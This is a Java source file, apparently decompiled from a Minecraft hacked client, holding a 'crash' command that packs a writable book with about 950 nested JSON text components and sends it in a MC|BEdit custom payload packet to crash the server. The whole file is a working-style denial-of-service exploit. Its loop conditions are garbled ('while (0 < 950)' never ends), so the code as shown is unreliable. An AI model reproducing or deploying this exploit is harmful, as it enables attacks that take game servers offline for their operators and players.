package DTool.command.impl;

import DTool.command.*;
import java.util.*;
import net.minecraft.client.*;
import net.minecraft.util.*;
import net.minecraft.client.audio.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import io.netty.buffer.*;
import net.minecraft.network.play.client.*;
import net.minecraft.network.*;
import Mood.*;

public class Crasher extends Command
{
    public static boolean SzerverGepMegbaszo;
    
    static {
        Crasher.SzerverGepMegbaszo = false;
    }
    
    public Crasher() {
        super("crash", "crash", "crash", new String[] { "crash" });
    }
    
    @Override
    public void onCommand(final String[] array, final String s) {
        final Random random = new Random();
        final char[] array2 = { '1', '2', '3', '4', '5', '6', '7', '9' };
        final char c = array2[random.nextInt(array2.length)];
        final Minecraft mc = Crasher.mc;
        Minecraft.getSoundHandler().playSound(PositionedSoundRecord.createPositionedSoundRecord(new ResourceLocation("gui.button.press"), 2.0f));
        final Minecraft minecraft = Minecraft.getMinecraft();
        final ItemStack itemStack = new ItemStack(Items.writable_book);
        final NBTTagCompound tagCompound = new NBTTagCompound();
        final NBTTagList list = new NBTTagList();
        String s2 = "{";
        int n = 0;
        while (0 < 950) {
            s2 = String.valueOf(String.valueOf(s2)) + "extra:[{";
            ++n;
        }
        while (0 < 950) {
            s2 = String.valueOf(String.valueOf(s2)) + "text:a}],";
            ++n;
        }
        final String string = String.valueOf(String.valueOf(s2)) + "text:a}";
        while (0 < 2) {
            list.appendTag(new NBTTagString(string));
            ++n;
        }
        tagCompound.setByte("resolved", (byte)1);
        tagCompound.setTag("pages", list);
        itemStack.setTagCompound(tagCompound);
        final PacketBuffer packetBuffer = new PacketBuffer(Unpooled.buffer());
        packetBuffer.writeItemStackToBuffer(itemStack);
        minecraft.getNetHandler().addToSendQueue(new C17PacketCustomPayload("MC|BEdit", packetBuffer));
        Segito.msg("§7Crasheltet\u00e9s elkezd\u0151d\u00f6tt...");
    }
}
